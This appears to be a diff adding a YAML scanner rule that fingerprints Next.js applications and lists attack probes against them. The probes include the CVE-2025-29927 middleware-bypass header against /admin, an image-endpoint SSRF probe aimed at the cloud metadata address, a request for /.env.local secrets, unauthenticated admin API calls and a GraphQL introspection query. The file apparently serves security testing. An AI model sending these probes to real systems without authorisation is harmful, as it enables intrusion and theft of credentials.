@@ -1,0 +1,121 @@
+# VulnOrigin-Operator — Next.js Rule
+# ====================================
+# Targets: Next.js applications (App Router + Pages Router)
+# 2026 research: Next.js middleware bypass (CVE-2025-29927),
+#               _next/image SSRF, getServerSideProps data leakage
+#
+# Risk notes:
+#   - /_next/static/ is PUBLIC by design — no finding on 200
+#   - /api/ routes may expose GraphQL, internal APIs
+#   - __nextjs_build_id leaks version → targeted CVE search
+
+name: nextjs
+category: Framework
+version: "1.0.0"
+
+detection:
+  headers:
+    - name: "X-Powered-By"
+      pattern: "Next\\.js"
+      confidence: 99
+    - name: "Server"
+      pattern: "Vercel"
+      confidence: 60
+  body_patterns:
+    - pattern: "__NEXT_DATA__"
+      confidence: 95
+    - pattern: "/_next/static/chunks"
+      confidence: 90
+    - pattern: "next/dist/client"
+      confidence: 85
+  cookies:
+    - "__nextjs"
+  js_globals:
+    - "__NEXT_DATA__"
+    - "next/router"
+
+safe_probes:
+  # 2026 CVE-2025-29927: middleware bypass via x-middleware-subrequest header
+  - path: "/admin"
+    method: GET
+    headers:
+      x-middleware-subrequest: "middleware:middleware:middleware:middleware:middleware"
+    risk: CRITICAL
+    description: >
+      CVE-2025-29927: Next.js middleware authorization bypass.
+      Sending x-middleware-subrequest header skips middleware execution,
+      potentially bypassing authentication on protected /admin routes.
+    tags: [cve, auth-bypass, 2025, critical]
+
+  - path: "/_next/image?url=http://169.254.169.254/latest/meta-data/&w=8&q=75"
+    method: GET
+    risk: HIGH
+    description: >
+      Next.js Image optimization SSRF probe.
+      If url= parameter fetches internal/cloud metadata endpoints,
+      SSRF is confirmed. AWS IMDS, GCP metadata, Azure IMDS.
+    tags: [ssrf, cloud, imds]
+
+  - path: "/api/auth/session"
+    method: GET
+    risk: HIGH
+    description: >
+      NextAuth.js session endpoint — may expose active session tokens,
+      user data, or JWT contents without authentication.
+    tags: [auth, session, information-disclosure]
+
+  - path: "/__nextjs_build_id"
+    method: GET
+    expected_status: [200]
+    risk: LOW
+    description: >
+      Next.js build ID endpoint — reveals exact build version.
+      Used to identify specific Next.js version for CVE targeting.
+    tags: [version-disclosure, recon]
+
+  - path: "/_next/data/buildId/index.json"
+    method: GET
+    risk: MEDIUM
+    description: >
+      Next.js data hydration endpoint — may expose getServerSideProps
+      data including database results, API keys, or internal paths.
+    tags: [data-leakage, ssr]
+
+  - path: "/api/graphql"
+    method: POST
+    body: '{"query":"{ __schema { types { name } } }"}'
+    headers:
+      content-type: "application/json"
+    risk: MEDIUM
+    description: >
+      GraphQL introspection probe — if enabled, reveals full schema
+      including mutations, queries, and potentially sensitive types.
+    tags: [graphql, introspection, api]
+
+  - path: "/.env.local"
+    method: GET
+    expected_status: [200, 403]
+    risk: CRITICAL
+    description: >
+      Next.js local environment file — often contains database URLs,
+      API keys, JWT secrets, and service credentials.
+    tags: [env-file, secrets, critical]
+
+  - path: "/api/admin/users"
+    method: GET
+    risk: HIGH
+    description: >
+      Common Next.js admin API endpoint — test for unauthorized access
+      to user management without authentication.
+    tags: [admin, api, unauth]
+
+adaptive_paths:
+  high_confidence:
+    - /api/
+    - /_next/
+    - /admin
+    - /dashboard
+  medium_confidence:
+    - /api/auth/
+    - /api/graphql
+    - /.env.local
